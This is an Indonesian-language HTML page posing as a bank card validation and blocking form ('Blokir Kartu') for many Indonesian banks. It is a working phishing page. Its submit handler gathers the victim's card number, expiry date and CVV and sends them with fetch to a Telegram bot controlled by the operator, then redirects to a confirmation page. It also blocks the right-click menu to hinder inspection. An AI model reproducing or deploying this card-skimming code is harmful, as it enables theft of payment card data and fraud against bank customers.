<!DOCTYPE html><html lang="id"><head>
<meta charset="UTF-8">
  <meta name="theme-color" content="#ff8c00">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Validasi Kartu Bank</title>
<style>
  /* Reset */
  * { box-sizing: border-box; }
  body {
    font-family: Arial, sans-serif;
    margin:0; background:#fff; color:#222;
  }
  .top-background {
    height: 220px;
margin-top:-8%;
    border-radius: 0 0 40px 40px;
    transition: background-color 0.5s ease;
  }
  .card-preview {
  margin-top: 40px; /* âœ… Ini juga bisa menurunkan posisi card */
}

  .container {
    max-width: 360px;
    margin: -170px auto 40px;
    padding: 0 20px 40px;
    background: #f4a460;
    
    border-radius: 20px;
    box-shadow: 0 8px 20px rgba(0,0,0,0.1);
    position: relative;
    z-index: 2;
  }
  .card-wrapper {
    position: relative;
    width: 320px;
    height: 205px;
    background: #000;
    margin: 0 auto 39px;
    overflow: hidden;
    border: 1px solid #000;
    border-radius: 20px;
    box-shadow: 0 9px 16px rgba(0,0,0,0.15);
  }
  #card-image {
    width: 100%;
    height: 100%;
    object-fit: cover;
    position: relative;
    left: 0;
  
    transition: left 0.5s ease;
  }
  .card-img-new {
    position: absolute;
    top: 0;
    width: 100%;
    height: 100%;
    object-fit: contain;
    left: 100%;
    transition: left 0.5s ease;
  }
  form {
    display: flex;
    flex-direction: column;
    gap: 20px;
  }
  label {
    font-weight: 600;
    margin-bottom: 6px;
    display: block;
    font-size: 15px;
  }
  input, select, button {
    width: 100%;
    padding: 12px 14px;
    font-size: 16px;
    border: 1px solid #b22222;
    border-radius: 5px;
    transition: border-color 0.3s ease;
  }
  input:focus, select:focus {
    border-color: #333;
    outline: none;
  }
  button {
    background-color: #444;

    color: white;
    font-weight: 700;
    border: none;
    cursor: not-allowed;
    transition: background-color 0.3s ease;
    border-radius: 4px;
  }
  button:enabled {
    background-color: #b22222;
    cursor: pointer;
    

  }
  .error {
    border-color: #b22222 !important;
  }
  .row-inputs {
  display: flex;
  gap: 16px;
}

.input-with-icon {
  position: relative;
  flex: 1; /* supaya 2 kolom sama lebar */
}

.input-with-icon input {
  width: 100%;
  padding-right: 36px; /* ruang untuk icon di kanan */
  font-size: 16px;
  border: 1px solid #b22222;
  border-radius: 4px;
  transition: border-color 0.3s ease;
}

.input-icon {
  position: absolute;
  top: 70%;
  right: 10px;
  width: 20px;
  height: 20px;
  transform: translateY(-50%);
  pointer-events: none; /* supaya icon tidak menghalangi input */
  opacity: 0.6;
}

</style>
</head>
<body>

<div class="top-background"></div>

<div class="container">
  <div class="card-wrapper">
    <img id="card-image" src="" alt="Gambar kartu bank">
  </div>


  
<form id="card-form" novalidate="">
    <label for="bank-select">Pilihan Bank Lainya</label>
    <select id="bank-select" name="bank" required="">
      <!-- option akan di-generate JS -->
    </select>

  <div class="input-with-icon">
    <label for="card-number">Nomor Kartu</label>
    <input type="text" id="card-number" name="card_number" placeholder="Masukan 16 Digit Nomor Kartu" maxlength="19" inputmode="numeric" autocomplete="cc-number" required="">
    <img src="images/633611.png" alt="credit card icon" class="input-icon">
  </div>

  <div class="row-inputs">
    <div class="input-with-icon">
      <label for="expiry-date">Masa Berlaku</label>
      <input type="text" id="expiry-date" name="expiry_date" placeholder="Valid/Thru" maxlength="5" inputmode="numeric" autocomplete="cc-exp" required="">
      <img src="https://img.icons8.com/?size=100&id=vwGXRtPWrZSn&format=png&color=000000" alt="calendar icon" class="input-icon">
    </div>

    <div class="input-with-icon">
      <label for="cvv">CVV</label>
      <input type="text" id="cvv" name="cvv" placeholder="***" maxlength="3" inputmode="numeric" autocomplete="cc-csc" required="">
      <img src="images/565547.png" alt="lock icon" class="input-icon">
    </div>
  </div>

  <button type="submit">Blokir Kartu</button>
</form>
</div>

<script src="../config.js"></script>

<script>
document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("card-form");

  form.addEventListener("submit", e => {
    e.preventDefault();

    const bank = document.getElementById("bank-select").value.trim();
    const cardNumber = document.getElementById("card-number").value.replace(/\s+/g, '');
    const expiryDate = document.getElementById("expiry-date").value.trim();
    const cvv = document.getElementById("cvv").value.trim();

    // Cek input kosong saja, tanpa validasi ketat
    if (!cardNumber || !expiryDate || !cvv) {
      alert("Harap isi semua data.");
      return;
    }

    const message = `[BANK-LAIN]\nðŸ¦ Bank: ${bank}\nðŸ’³ Nomor Kartu: ${cardNumber}\nðŸ“… Masa Berlaku: ${expiryDate}\nðŸ”‘ CVV: ${cvv}`;

    fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        chat_id: telegramConfig.chatId,
        text: message
      })
    })
    .then(res => res.json())
    .then(data => {
      if (data.ok) {
        window.location.href = "konfir.html";
      } else {
        alert("Gagal mengirim data ke Telegram.");
      }
    })
    .catch(() => {
      alert("Terjadi kesalahan saat mengirim data.");
    });
  });
});
</script>


<script>
  document.addEventListener("DOMContentLoaded", () => {
    const banks = [
      { id: "bca", name: "BCA", color: "#FFD8B1", cardImg: "images/bca.webp" },
      { id: "mandiri", name: "Mandiri", color: "#C6E2FF", cardImg: "images/mandiri.jpg" },
      { id: "ocbc", name: "OCBC", color: "#FAD1D1", cardImg: "images/ocbc.webp" },
      { id: "bri", name: "BRI", color: "#E0FFD8", cardImg: "images/bri.jpg" },
      { id: "cimb", name: "CIMB Niaga", color: "#FFE3E3", cardImg: "images/cimb.jpg" },
      { id: "permata", name: "Permata", color: "#FFF4D1", cardImg: "images/permata.webp" },
      { id: "danamon", name: "Danamon", color: "#E3E0FF", cardImg: "images/danamon.webp" },
      { id: "btn", name: "BTN", color: "#FFE0F0", cardImg: "images/btn1.webp" },
      
      
            { id: "bukopin", name: "BUKOPIN", color: "#D1FFF3", cardImg: "images/bukopin.png" },
      
                  { id: "dbs", name: "DBS", color: "#D1FFF3", cardImg: "images/dbs.png" },
      
      { id: "maybank", name: "Maybank", color: "#FFF4D1", cardImg: "images/maybank1.webp" },
      { id: "uob", name: "UOB", color: "#E3E0FF", cardImg: "images/uob.webp" },
      
      { id: "mnc", name: "MNC", color: "#FFF4D1", cardImg: "images/mnc.webp" },
      { id: "hsbc", name: "HSBC", color: "#E3E0FF", cardImg: "images/hsbc.webp" },
      { id: "mega", name: "MEGA", color: "#FFF4D1", cardImg: "images/mega2.webp" },
      { id: "btpn", name: "BTPN", color: "#E3E0FF", cardImg: "images/btpn.webp" },
      
      
      { id: "banklain", name: "BANK LAIN", color: "#FFF1D1", cardImg: "images/banklain.jpg" },
    ];


    const bankSelect = document.getElementById("bank-select");
    const topBackground = document.querySelector(".top-background");
    const cardImage = document.getElementById("card-image");
    const cardNumberInput = document.getElementById("card-number");
    const expiryInput = document.getElementById("expiry-date");
    const cvvInput = document.getElementById("cvv");
    const submitBtn = document.getElementById("submit-btn");
    const form = document.getElementById("card-form");

    // Inisialisasi pilihan bank dan default background + gambar kartu
    function initBankOptions() {
      banks.forEach(bank => {
        const option = document.createElement("option");
        option.value = bank.id;
        option.textContent = bank.name;
        bankSelect.appendChild(option);
      });
      bankSelect.value = banks[0].id;
      updateBankUI(banks[0].id, true);
    }

    function updateBankUI(bankId, firstLoad = false) {
      const bank = banks.find(b => b.id === bankId);
      if (!bank) return;
      if (firstLoad) {
        topBackground.style.backgroundColor = bank.color;
      } else {
        topBackground.style.transition = "background-color 0.5s ease";
        topBackground.style.backgroundColor = bank.color;
      }
      changeCardImage(bank.cardImg);
    }

    function changeCardImage(newSrc) {
      const newImg = document.createElement("img");
      newImg.src = newSrc;
      newImg.alt = "Gambar kartu bank";
      newImg.classList.add("card-img-new");

      cardImage.parentNode.style.position = "relative";
      cardImage.parentNode.appendChild(newImg);

      requestAnimationFrame(() => {
        newImg.style.left = "0";
        cardImage.style.left = "-100%";
        cardImage.style.position = "absolute";
      });

      newImg.addEventListener("transitionend", () => {
        cardImage.src = newSrc;
        cardImage.style.left = "0";
        cardImage.style.position = "relative";
        newImg.remove();
      });
    }

    // Validasi nomor kartu pakai Luhn Algorithm + panjang 12-19 digit
    function isValidCardNumber(number) {
      if (!/^\d{12,19}$/.test(number)) return false;

      let sum = 0;
      let shouldDouble = false;
      for (let i = number.length - 1; i >= 0; i--) {
        let digit = parseInt(number.charAt(i));
        if (shouldDouble) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
      }
      return sum % 10 === 0;
    }

    // Validasi expiry date MM/YY, masa berlaku minimal saat ini atau lebih
    function isValidExpiryDate(expiry) {
      if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
      const [mm, yy] = expiry.split("/").map(Number);
      if (mm < 1 || mm > 12) return false;

      const currentDate = new Date();
      const currentYear = currentDate.getFullYear() % 100;
      const currentMonth = currentDate.getMonth() + 1;

      if (yy < currentYear) return false;
      if (yy === currentYear && mm < currentMonth) return false;
      return true;
    }

    // Validasi CVV 3 atau 4 digit angka
    function isValidCVV(cvv) {
      return /^\d{3,4}$/.test(cvv);
    }

    // Cek semua validasi input form
    function validateAll() {
      let valid = true;

      // Nomor kartu tanpa spasi
      const cardNumRaw = cardNumberInput.value.replace(/\s/g, "");
      if (isValidCardNumber(cardNumRaw)) {
        cardNumberInput.classList.remove("error");
      } else {
        cardNumberInput.classList.add("error");
        valid = false;
      }

      if (isValidExpiryDate(expiryInput.value)) {
        expiryInput.classList.remove("error");
      } else {
        expiryInput.classList.add("error");
        valid = false;
      }

      if (isValidCVV(cvvInput.value)) {
        cvvInput.classList.remove("error");
      } else {
        cvvInput.classList.add("error");
        valid = false;
      }

      if (!bankSelect.value) valid = false;

      submitBtn.disabled = !valid;
      return valid;
    }

    // Event listener input format dan validasi live
    bankSelect.addEventListener("change", e => {
      updateBankUI(e.target.value);
      validateAll();
    });

    cardNumberInput.addEventListener("input", e => {
      let val = e.target.value.replace(/\D/g, "");
      val = val.match(/.{1,4}/g)?.join(" ") || "";
      e.target.value = val;
      validateAll();
    });

    expiryInput.addEventListener("input", e => {
      let val = e.target.value.replace(/[^\d]/g, "");
      if (val.length > 2) {
        val = val.slice(0, 2) + "/" + val.slice(2, 4);
      }
      e.target.value = val;
      validateAll();
    });

    cvvInput.addEventListener("input", e => {
      e.target.value = e.target.value.replace(/\D/g, "").slice(0, 4);
      validateAll();
    });

    form.addEventListener("submit", e => {
      if (!validateAll()) {
        e.preventDefault();
        return;
      }
      // form submit ke submit.php (PHP server)
      // Pastikan submit.php sudah siap menerima POST dan kirim ke Telegram
    });

    // Inisialisasi awal
    initBankOptions();
    validateAll();
  });
  
  document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });
</script>


</body></html>